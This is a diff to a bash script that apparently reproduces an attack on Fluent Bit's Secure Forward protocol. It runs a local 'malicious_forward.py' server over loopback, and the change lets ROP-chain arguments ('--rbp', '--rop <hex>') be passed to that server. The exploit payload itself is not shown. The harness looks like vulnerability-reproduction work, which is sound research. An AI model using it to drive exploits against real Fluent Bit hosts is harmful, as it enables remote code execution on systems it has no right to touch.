@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 # Live-wire Secure-Forward PONG reproduction. Loopback only.
-# Usage: run_live.sh <fluent-bit-binary> <port> <attack|authorized|short> <tag>
+# Usage: MALICIOUS_EXTRA='--rbp 0 --rop <hex>' run_live.sh <binary> <port> <mode> <tag>
+
 set -u
 BIN=$1; PORT=$2; MODE=$3; TAG=$4
 HERE=$(cd "$(dirname "$0")" && pwd)
@@ -17,9 +18,15 @@ case "$MODE" in
   authorized) EXTRA=(--authorized) ;;
   short)      EXTRA=(--short) ;;
   *) echo "bad mode" >&2; exit 2 ;;
-esac
+ esac
 
-python3 "$HERE/malicious_forward.py" --port "$PORT" "${EXTRA[@]}" > "$SERVERLOG" 2>&1 &
+if [ -n "${MALICIOUS_EXTRA:-}" ]; then
+  read -r -a MOREEXTRA <<< "$MALICIOUS_EXTRA"
+  EXTRA+=("${MOREEXTRA[@]}")
+fi
+
+ python3 "$HERE/malicious_forward.py" --port "$PORT" "${EXTRA[@]}" > "$SERVERLOG" 2>&1 &
+
 SPID=$!
 sleep 0.7
 
